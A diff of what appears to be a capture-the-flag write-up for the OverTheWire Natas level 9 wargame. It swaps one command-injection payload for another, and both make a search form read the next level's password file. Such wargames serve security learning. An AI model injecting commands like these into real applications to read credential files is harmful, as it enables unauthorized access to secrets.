@@ -6,7 +6,7 @@ URL: http://natas9.natas.labs.overthewire.org
 Using [Command Injection](https://owasp.org/www-community/attacks/Command_Injection) I was able to obtain the passord.
 
 ```
-; cat /etc/natas_webpass/natas10
+. /etc/natas_webpass/natas10 dictionary.txt
 ```
 
 ## Password
